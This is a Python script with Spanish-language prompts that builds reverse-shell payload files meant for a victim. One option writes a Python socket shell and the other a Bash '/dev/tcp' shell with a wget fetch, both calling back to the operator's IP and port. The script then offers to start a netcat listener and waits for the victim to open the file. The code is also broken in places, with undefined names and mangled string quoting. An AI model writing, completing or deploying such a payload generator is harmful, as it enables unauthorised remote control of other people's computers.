import os

path_malware = getcwd()+ '/malware_victima/'

numero = int(input("""

Escoja la opcion que desea 

1: reverse shell en Python {.py}
2: reverse shell en Bash {.sh}

>  """))

if numero == 1: 
   ip = input("""
   Introduzca su ip
   
   >  """)
    
   puerto = input("""
   Introduzca un puerto {ejemplo: 4444}
   
   >  """)
   viruspy = "import os\n"\
             "wget http://'+ ip +'\n"\
             "os.system('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"'ip'\",'puerto'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'')"
           
   with open("'+ path_malware +''+ malware +'", "w")as f:
      f.write(viruspy)
   option_listen = input("""
   Ahora necesita abrir un listener en el puerto "+ puerto +" para poder conecatarse cuando la victima ejecute el archivo.
   
   Quiere desplegar un listener?  [y/n] 
   
   >  """)
   if option_listen == "y":
      clearScr()
      print("No cierre esta terminal, cuando la victima habra el archivo se habrá conectado a la maquina remotamente.")
      os.system('nc -nlvp '+ puerto +'')
   else:
      print("Sin listener no puedo conectarme al equipo victima :(")

if numero == 2:
   ip = input("""
   Introduzca su ip
   
   >  """)
    
   puerto = input("""
   Introduzca un puerto {ejemplo: 4444}
   
   >  """)
   virussh = "#!/bin/bash\n"\
             "wget http://'+ ip +''+ nombre_malware +'\n"\
             "clear\n"\
             "bash -i >& /dev/tcp/'+ ip +'/'+ puerto +' 0>&1\n"\
             "clear"
   with open("'+ path_malware +''+ malware +'", "w")as f:
      f.write(virussh)
   
   
   
   
   
   
   
   
  
